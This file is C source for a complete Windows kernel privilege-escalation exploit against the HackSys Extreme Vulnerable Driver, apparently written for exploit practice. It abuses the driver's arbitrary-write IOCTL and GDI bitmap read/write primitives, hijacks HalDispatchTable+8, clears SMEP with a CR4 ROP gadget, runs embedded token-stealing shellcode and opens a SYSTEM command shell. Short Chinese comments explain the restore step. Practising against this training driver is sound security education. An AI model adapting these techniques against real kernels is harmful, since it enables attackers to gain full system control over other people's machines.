#include <stdio.h>
#include <Windows.h>
#include <Psapi.h>

extern "C" VOID StealToken(void);

#define DEVICE_NAME L"\\\\.\\HackSysExtremeVulnerableDriver"
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE 0x22200B

BYTE StealTokenByteCode[] = {
	0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00,
	0x48, 0x8B, 0x80, 0x20, 0x02, 0x00, 0x00,
	0x48, 0x8B, 0xC8,
	0x4C, 0x8B, 0xD9,
	0x49, 0x83, 0xE3, 0x07,
	0x48, 0xC7, 0xC2, 0x04, 0x00, 0x00, 0x00,
	0x48, 0x8B, 0x80, 0xE8, 0x02, 0x00, 0x00,
	0x48, 0x2D, 0xE8, 0x02, 0x00, 0x00,
	0x48, 0x39, 0x90, 0xE0, 0x02, 0x00, 0x00,
	0x75, 0xEA,
	0x48, 0x8B, 0x90, 0x48, 0x03, 0x00, 0x00,
	0x48, 0x83, 0xE2, 0xF0,
	0x49, 0x0B, 0xD3,
	0x48, 0x89, 0x91, 0x48, 0x03, 0x00, 0x00,
	0x48, 0x83, 0xEC, 0x30,
	0x48, 0xB8, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA, 0xAA,
	0x48, 0x89, 0x04, 0x24,
	0xC3
};

typedef NTSTATUS(NTAPI* PNtQuerySystemInformation)(
	ULONG SystemInformationClass,
	PVOID SystemInformation,
	ULONG SystemInformationLength,
	PULONG ReturnLength
	);

typedef NTSTATUS(NTAPI* PNtQueryIntervalProfile)(
	DWORD ProfileSource,
	PULONG Interval
	);
typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation = 0,
	SystemPerformanceInformation = 2,
	SystemTimeOfDayInformation = 3,
	SystemProcessInformation = 5,
	SystemProcessorPerformanceInformation = 8,
	SystemModuleInformation = 11,
	SystemInterruptInformation = 23,
	SystemExceptionInformation = 33,
	SystemRegistryQuotaInformation = 37,
	SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	ULONG64              Reserved1;
	ULONG64              Reserved2;
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	BYTE                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct _WRITE_WHAT_WHERE {
	PULONG_PTR What;
	PULONG_PTR Where;
}WRITE_WHAT_WHERE, * PWRITE_WHAT_WHERE;

ULONG64 ntoskrnlBase;
HBITMAP hManagerBitmap = NULL;
HBITMAP hWorkerBitmap  = NULL;

ULONG64 GetGdiSharedHandleTableAddr()
{
	ULONG64 tebAddr = (ULONG64)NtCurrentTeb();
	ULONG64 pebAddr =  *(PULONG64)(tebAddr + 0x60);
	ULONG64 GdiSharedHandleTableAddr = *(PULONG64)(pebAddr + 0xf8);

	return  GdiSharedHandleTableAddr;
}

ULONG64 GetBitmapAddr(HBITMAP hBitmap)
{
	ULONG64 index = (ULONG64)hBitmap & 0xffff;
	ULONG64 bitmapAddr = *(PULONG64)(GetGdiSharedHandleTableAddr() + index * 0x18);

	return bitmapAddr;
}

HANDLE GetDeviceHandle()
{
    HANDLE hRet = NULL;
    hRet = CreateFile(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
        NULL
    );

    if (hRet == INVALID_HANDLE_VALUE) {
        printf("Error open device with error code: %d\n", GetLastError());
		exit(-1);
    }

    return hRet;
}

PSYSTEM_MODULE GetNtoskrnlInfo()
{
    HMODULE ntdll = GetModuleHandle(L"ntdll");
    if (ntdll == NULL) {
        printf("[-] Failed to get handle to ntdll.dll.\n");
        exit(-1);
    }

    PNtQuerySystemInformation _NtQuerySystemInformation =
        (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (_NtQuerySystemInformation == NULL) {
		printf("[-] Failed to get address of NtQuerySystemInformation.\n");
		exit(-1);
	}

	ULONG retLength;
	_NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &retLength);
	PSYSTEM_MODULE_INFORMATION ModuleInfo =
		(PSYSTEM_MODULE_INFORMATION)VirtualAlloc(NULL, retLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!ModuleInfo) {
		printf("[-] Failed to allocate memory for ModuleInfo.\n");
		exit(-1);
	}

	_NtQuerySystemInformation(SystemModuleInformation, ModuleInfo, retLength, &retLength);
	return &ModuleInfo->Modules[0];
}

ULONG64 GetHalDispatchTableAddr(char *fullName)
{
	char* krnlName = strrchr(fullName, '\\') + 1;
	DWORD dBufSize = MultiByteToWideChar(CP_ACP, 0, krnlName, (int)strlen(krnlName), NULL, 0);
	WCHAR* dBuf = (WCHAR*)malloc(sizeof(WCHAR) * ((size_t)dBufSize + 1));
	int iRet = MultiByteToWideChar(CP_ACP, 0, krnlName, (int)strlen(krnlName) + 1, dBuf, dBufSize + 1);
	if (iRet <= 0 || dBuf == NULL) {
		printf("[-] Failed to convert char to wchar.\n");
		exit(-1);
	}

	HMODULE ntoskrnlUser = LoadLibraryEx(dBuf, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (ntoskrnlUser == NULL) {
		printf("[-] Failed to load kernel image.\n");
		exit(-1);
	}
	printf("[+] Loaded kernel in usermode using LoadLibraryEx: %p.\n", ntoskrnlUser);

	ULONG64 userHalDispatchTable = (ULONG64)GetProcAddress(ntoskrnlUser, "HalDispatchTable");
	if (userHalDispatchTable == NULL) {
		printf("[+] Failed to locate HalDispatchTable");
	}
	ULONG64 offHalDispatchTable = userHalDispatchTable - (ULONG64)ntoskrnlUser;
	ULONG64 addrHalDispatchTable = offHalDispatchTable + ntoskrnlBase;
	printf("[+] Found address to HalDispatchTable at 0x%llx.\n", addrHalDispatchTable);

	return addrHalDispatchTable;
}

VOID HEVDArbitraryOverwrite(PWRITE_WHAT_WHERE pWWW)
{
	HANDLE driver = GetDeviceHandle();
	if (driver == NULL) {
		printf("[-] Failed open handle to driver.\n");
		exit(-1);
	}
	printf("[+] Opened handle to driver: %p.\n", driver);

	DWORD retBytes;
	if (DeviceIoControl(
		driver,
		HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
		pWWW,
		sizeof(WRITE_WHAT_WHERE),
		NULL,
		0,
		&retBytes,
		NULL
	)) {
		printf("[+] Sent buffer to driver.\n");
	}
	else {
		printf("[-] Failed to send buffer to driver.\n");
		exit(-1);
	}
}

VOID PrepareBitmapArbitraryReadWrite()
{
	CHAR pvScan0[] = "AAAA";

	hManagerBitmap = CreateBitmap(0x20, 0x2, 1, 8, &pvScan0);
	hWorkerBitmap = CreateBitmap(0x20, 0x2, 1, 8, &pvScan0);
	if (hManagerBitmap == NULL || hWorkerBitmap == NULL) {
		printf("[-] Failed to CreateBitmap.\n");
		exit(-1);
	}

	ULONG64 pManagerpvScan0 = GetBitmapAddr(hManagerBitmap) + 0x50;
	ULONG64 pWorkerpvScan0 = GetBitmapAddr(hWorkerBitmap) + 0x50;

	WRITE_WHAT_WHERE www = { 0 };
	www.Where = (PULONG_PTR)pManagerpvScan0;
	www.What = &pWorkerpvScan0;
	
	HEVDArbitraryOverwrite(&www);
	printf("[+] Ready to arbitrary read and write via bitmap.\n");
}

VOID ArbitraryRead(ULONG64 where, PULONG64 what, int len)
{
	SetBitmapBits(hManagerBitmap, len, &where);
	GetBitmapBits(hWorkerBitmap, len, what);
}

VOID ArbitraryWrite(ULONG64 where, PULONG64 what, int len)
{
	SetBitmapBits(hManagerBitmap, len, &where);
	SetBitmapBits(hWorkerBitmap, len, what);
}

/*
nt!KiConfigureDynamicProcessor+0x40:
fffff803`265ff3cc 0f22e0          mov     cr4,rax    <---- gadget here

nt!KiConfigureDynamicProcessor+0x43:
fffff803`265ff3cf 4883c428        add     rsp,28h
fffff803`265ff3d3 c3              ret
*/
ULONG64 PrepareShellCode()
{
	ULONG64 gadget = ntoskrnlBase + 0x38A3CC;

	PVOID payload = (PVOID)0x100000;
	payload = VirtualAlloc(payload, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (payload == NULL) {
		printf("[-] Failed to alloc 0x100000.\n");
		exit(-1);
	}
	memset(payload, 'A', 0x1000);
	CopyMemory((PVOID)0x100200, StealTokenByteCode, sizeof(StealTokenByteCode));

	*(PULONG64)(0x100200 + 0x52) = ntoskrnlBase + 0x4b85c9;

	return gadget;
}

VOID Trigger()
{
	HMODULE ntdll = GetModuleHandle(L"ntdll");
	if (ntdll == NULL) {
		printf("[-] Failed to get handle of ntdll.\n");
		exit(-1);
	}
	PNtQueryIntervalProfile _NtQueryIntervalProfile = (PNtQueryIntervalProfile)GetProcAddress(
		ntdll,
		"NtQueryIntervalProfile"
	);
	if (_NtQueryIntervalProfile == NULL) {
		printf("[-] Failed to get address of NtQueryIntervalProfile.\n");
		exit(-1);
	}
	printf("[+] Address of NtQueryIntervalProfile: %p.\n", _NtQueryIntervalProfile);
	ULONG newCr4 = 0x406f8;
	_NtQueryIntervalProfile(0x100200, &newCr4);         //
}

int main()
{
	// get ntoskrnl base
	SYSTEM_MODULE krnlInfo = *GetNtoskrnlInfo();
	ntoskrnlBase = (ULONG64)krnlInfo.ImageBaseAddress;
	printf("[+] ntoskrnl.exe base address: 0x%llx.\n", ntoskrnlBase);

	ULONG64 addrHalDispatchTable = GetHalDispatchTableAddr((char *)krnlInfo.Name);
	
	PrepareBitmapArbitraryReadWrite();

	ULONG64 addrShellcode = PrepareShellCode();
	ULONG64 originVal;

	ArbitraryRead(addrHalDispatchTable + 8, &originVal, 8);
	ArbitraryWrite(addrHalDispatchTable + 8, &addrShellcode, 8);                 // 如果没有恢复HALDispatchTable+8原来的值，短时间内不会蓝屏。也可以不用bitmap，bitmap只是多了个任意地址读的功能，用来恢复HALDispatchTable+8
	                                                                          // 单单使用HEVD的任意地址写到HalDispatchTable+8，可以完成利用。
	Trigger();

	ArbitraryWrite(addrHalDispatchTable + 8, &originVal, 8);

	printf("[+] Create a system's shell.\n");
	system("cmd.exe");

	return 0;
}